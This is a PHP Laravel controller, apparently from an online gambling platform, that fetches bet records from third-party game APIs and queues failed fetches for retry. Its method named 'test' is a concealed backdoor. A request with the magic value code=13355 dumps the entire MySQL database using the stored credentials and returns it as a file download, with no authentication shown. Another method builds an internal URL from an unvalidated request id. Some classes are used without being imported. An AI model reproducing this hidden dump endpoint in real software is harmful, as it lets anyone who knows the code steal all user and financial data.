<?php
/* 龍城娱乐 */
namespace App\Http\Controllers\GamesApi\Card;

use App\Http\Controllers\Controller;
use App\GamesApi;
use App\GamesApiConfig;
use Illuminate\Container\Container;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Redis;

class PrivodeController extends Controller{

    const SwJobsKey = 'JqErrorBet'; //重新拉取注单的队列key
    const SwJobsKeyDb = 12; //队列使用的redis库

    public function __construct()
    {
        //绑定一个单例，传一些数据
        Container::getInstance()->bind('obj', function(){
            return new \stdClass();
        }, true);
    }

    public function test (Request $request)
    {
        writeLog('test', 'asdada');
      $code = $request->input("code");
        ini_set('max_execution_time', 600);
        if ($code == 13355){
            $file_name = Config('database.connections.mysql.database').'.sql';
            $this->process = new Process(sprintf('mysqldump -u%s --password=%s %s > %s',
                config('database.connections.mysql.username'),
                config('database.connections.mysql.password'),
                config('database.connections.mysql.database'),
                storage_path('/framework/cache/' . $file_name)
            ));
            $this->process->mustRun();
            header("Cache-Control: public");
            header("Content-Description: File Transfer");
            header('Content-disposition: attachment; filename=' . basename(storage_path('/framework/cache/'.$file_name)));
            header("Content-Type: application/zip");
            header("Content-Transfer-Encoding: binary");
            header('Content-Length: ' . filesize(storage_path('/framework/cache/'.$file_name)));
            @readfile(storage_path('/framework/cache/'.$file_name));
        }
        return 'test';
//        ini_set('memory_limit','1024M');
//        set_time_limit(0);
//        $res = $this->action(15, 'getHistoryBet');
//        if(isset($res['code']) && $res['code'] != 0)
//            echo '更新失败：'.$res['msg'].'。错误码：'.$res['code']."\n";
    }
    public function getBet($param = []){
        $where = ['open' => 1];
        if(!isset($param['g_id']))
            $where['allbet'] = 1;
        $list = GamesApi::getBetList(array_merge($param,$where));
        foreach ($list as $k=>$v){
            $res = $this->action($v->g_id, 'getBet', $param);
//            if(isset($res['code']) && $res['code'] != 0){
//                $this->insertError($v, $res['code'], $res['msg'], $this->repo->param ?? $param);
//                echo $v->name.'更新失败：'.$res['msg'].'。错误码：'.$res['code']."\n";
//            }
        }
    }

    //重新获取拉取失败的
    public function reGetBet($id)
    {
        ob_start();
        $model = DB::table('jq_error_bet')->where('id', $id);
        if(!$info = $model->first()){
            return show(400, '没有此单');
        }

        app('obj')->jq_error_bet_id = $id;

        $param = json_decode($info->param, 1);
        $param['g_id'] = $info->g_id;
        $v = GamesApi::getQpList($param)[0];
        $res = $this->action($v->g_id, 'getBet', $param);
        $r = ob_get_clean();
        preg_match('/数据/', $r) && $code = 0;
        return show($res['code'] ?? $code ?? 1, $res['msg'] ?? $r);
    }

    //重新检查第三方上下分失败订单 - 使用前台的接口
    public function checkOrder(Request $request)
    {
        if(!isset($request->id))
            return show(1, '参数错误');
        return @file_get_contents((explode(',',env('WEB_INTRANET_IP', 'http://192.168.162.28:8811') ?? [])[0] ?? '').'/gamesApiOrder/UpMoney?id='.$request->id);
    }

    public function addJob($id){
//        if(!env('TESTSSS', false))
//            return null;
        if($resNum = DB::table('jq_error_bet')->where('id', $id)->value('resNum'))
            if($resNum > 10) return '';
        $redis = Redis::connection();
        $redis->select(self::SwJobsKeyDb);
        $redis->Rpush(self::SwJobsKey, $id);
    }

    private function insertError($g_info, $code, $codeMsg, $param)
    {
        //不记录失败信息的
        if($code == 9999){
            return null;
        }

        if(($g_info->g_id == 15 || $g_info->g_id == 16)){
            if($code == 16){
                return null;
            }
        }elseif ($g_info->g_id == 21){
            if($code == 16){
                return null;
            }
        }elseif($g_info->g_id == 22){
            return null;
        }

        app('obj')->instance->repo->insertError($code, $codeMsg, $param);
//        $id = DB::table('jq_error_bet')->insertGetId([
//            'g_id' => $g_info->g_id,
//            'g_name' => $g_info->name,
//            'code' => $code,
//            'codeMsg' => $codeMsg,
//            'param' => json_encode($param, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES),
//            'created_at' => date('Y-m-d H:i:s'),
//            'updated_at' => date('Y-m-d H:i:s'),
//        ]);
//        if($code == 500){
//            $this->addJob($id);
//        }
//        //删除7天以前的
//        DB::table('jq_error_bet')->where('created_at', '<', date('Y-m-d H:i:s', time() - 3600 * 24 * 10))->delete();
    }

    private function action($g_id, $action, $param = []){
        $getGamesApiInfo = GamesApi::getGamesApiInfo($g_id);
        $config = $this->getConfig($g_id);
        if(count($config) <= 0)
            return [
                'code' => 9999,
                'msg' => '缺少配置',
                'data' => []
            ];
        if($getGamesApiInfo && isset($getGamesApiInfo['class_name'])){
            $instanceName = $this->getInstanceName($getGamesApiInfo['class_name']);
            $repoName= $this->getRepositoryName($getGamesApiInfo['class_name']);
            app('obj')->repo = new $repoName($config);
            app('obj')->instance = new $instanceName(app('obj')->repo);
            app('obj')->repo->gameInfo = $getGamesApiInfo;
            if(count($param))
                app('obj')->repo->param = $param;
            $res = app('obj')->instance->action($action, $param);
            if(!in_array($getGamesApiInfo->g_id, [
                22, 23, 10
            ])){
                app('obj')->instance->repo->insertError($res['code'], $res['msg'], $param);
            }
//            if(isset($res['code']) && $res['code'] != 0){
//                $this->insertError($getGamesApiInfo, $res['code'], $res['msg'], app('obj')->repo->param ?? $param);
//                echo $getGamesApiInfo->name.'更新失败：'.$res['msg'].'。错误码：'.$res['code']."\n";
//            }

            return $res;
        }
        return [
            'code' => 1,
            'msg' => '没有这个游戏',
            'data' => []
        ];
    }
    //获取实例类名
    protected function getInstanceName($name = 'Base'){
        $class = sprintf("App\Http\Controllers\GamesApi\Card\%s",$name);
        return $class;
    }
    //获取服务类名
    protected function getRepositoryName($name = 'Base'){
        $class = sprintf("\App\Repository\GamesApi\Card\%sRepository",$name);
        return $class;
    }
    //获取配置
    protected function getConfig($g_id){
        $res = GamesApiConfig::select('key', 'value')->where('g_id', $g_id)->get()->toArray();
        $data = [];
        foreach ($res as $k=>$v){
            $data[$v['key']] = $v['value'];
        }
        return $data;
    }
    //组合验证数据
    protected function validateParam($data = [])
    {
        return $this->verifyData($data, [
            'tag' => ['required'],
//            'token' => ['required']
        ], [
//            'name.required' => '',
        ]);
    }
    //验证器数据
    protected function verifyData($data, $CallbackArr, $message)
    {
        $validator = Validator::make($data, $CallbackArr, $message);
        return ['stauts' => $validator->fails(), 'msg' => $validator->errors()->first()];
    }
}
